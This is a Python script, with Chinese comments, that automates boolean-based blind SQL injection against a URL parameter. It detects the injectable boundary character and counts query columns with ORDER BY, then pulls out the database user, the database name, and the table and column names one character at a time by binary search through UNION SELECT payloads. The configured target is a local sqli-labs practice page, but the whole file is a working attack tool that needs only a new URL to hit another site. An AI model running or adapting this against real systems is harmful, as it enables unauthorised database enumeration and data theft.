# /usr/bin/env python3.6
# coding=utf8

import sys
import math
import logging
import requests


def get(url):
	logging.info('[*] GET {}'.format(url))
	r = requests.get(url=url, timeout=TIME_OUT)
	if r.status_code != 200:
		logging.warn('The url {} returns {}'.format(url, r.status_code))
	return r.text


def is_right(html):
	"""
	根据HTTP请求返回页面判断SQL是否正确执行
	"""
	if ERROR_STRING in html:
		return False
	else:
		return True


def is_vulnerability(target):
	"""
	确定目标是否存在注入漏洞
	"""
	payloads = ['\'', '\')', '\'))', '"', '")' '"))']
	for payload in payloads:
		r_error = get(target.format(VALUE + payload))
		r_right = get(target.format(VALUE + payload + COMMENT))
		if is_right(r_error) is False and is_right(r_right) is True:
			cross = payload
			logging.info('[+] SQL injection vulnerability exists, cross boundary symbol is `{}`.'.format(payload))
			break
	else:
		cross = None
		logging.fatal('[-] No SQL injection vulnerability exists.')
	return cross


def how_many_fields(target, cross):
	"""
	确定联合查询的字段数量
	"""
	for i in range(1, 100):
		if is_right(get(target.format(VALUE + cross + 'order by {}'.format(i) + COMMENT))) is False:
			field_number = i-1
			logging.info('[+] The number of fields in the original query is {}.'.format(field_number))
			break
	else:
		logging.fatal('[-] Failed to detect the number of fields in the original query, perhaps greater than 100.')
		field_number = 0
	return field_number


def binary_chop(target, cross, field_number, select):
	"""
	使用二分法查询数据
	"""
	real_values = str()
	union_select = 'union select {} from information_schema.tables where ascii(substr(({}), {{}}, 1)) <= {{}}'.format(', '.join([str(i) for i in range(field_number)]), select)

	n = 1
	while True:
		max_value = 127
		min_value = 0

		if is_right(get(target.format(cross + union_select.format(n, min_value) + COMMENT))):
			break
		if not is_right(get(target.format(cross + union_select.format(n, max_value) + COMMENT))):	
			break

		while min_value < max_value-1:
			middle_value = math.ceil((max_value+min_value)/2)

			if is_right(get(target.format(cross + union_select.format(n, middle_value) + COMMENT))):
				max_value = middle_value
			else:
				min_value = middle_value

		if is_right(get(target.format(cross + union_select.format(n, max_value) + COMMENT))):
			real_value = max_value
		else:
			real_value = min_value

		real_values += chr(real_value)
		n += 1

	return real_values


def main(target):
	"""
	对目标进行基于二分查找的SQL盲注
	"""
	# 检查是否有注入漏洞
	cross = is_vulnerability(target)
	if cross is None:
		exit(-1)

	# 确定联合查询的字段数量
	field_number = how_many_fields(target, cross)
	if field_number == 0:
		exit(-1)

	# 使用二分返回用户名
	select = 'select user()'
	user = binary_chop(target, cross, field_number, select)
	print('{}: {}'.format(select, user))

	# 使用二分返回数据库名
	select = 'select database()'
	database = binary_chop(target, cross, field_number, select)
	print('{}: {}'.format(select, database))

	# 使用二分返回表名
	tables = list()
	n = 0
	while True:
		select = 'select table_name from information_schema.tables where table_schema = "{}" limit {}, 1'.format(database, n)
		data = binary_chop(target, cross, field_number, select)
		if data != '':
			tables.append(data)
			n += 1
		else:
			break
	print('There are tables {} in database {}'.format(', '.join(tables), database))

	# 使用二分返回列名
	for table in tables:
		columns = list()
		n = 0
		while True:
			select = 'select column_name from information_schema.columns where table_schema = "{}" and table_name = "{}" limit {}, 1'.format(database, table, n)
			data = binary_chop(target, cross, field_number, select)
			if data != '':
				columns.append(data)
				n += 1
			else:
				break
		print('There are columns {} in table {}'.format(', '.join(columns), table))	



if __name__ == '__main__':

	TARGET = 'http://127.0.0.1/sqlilabs/Less-8/?id={}'    # 存在注入点的URL，参数值用{}替代
	VALUE = '1'    # 注入参数的原值
	COMMENT = '+--+'    # SQL注释格式
	TIME_OUT = 5    # 请求超时时间，单位为秒
	ERROR_STRING = '<font size="5" color="#FFFF00"></br></font>'    # SQL执行有错时返回页面中会包含的字符串，SQL执行无错误时不包含
	LOGGING_LEVEL = logging.WARN    # 日志级别

	logging.basicConfig(level=LOGGING_LEVEL)
	logging.debug('[*] The target is {}'.format(TARGET.format(VALUE)))
	main(TARGET)
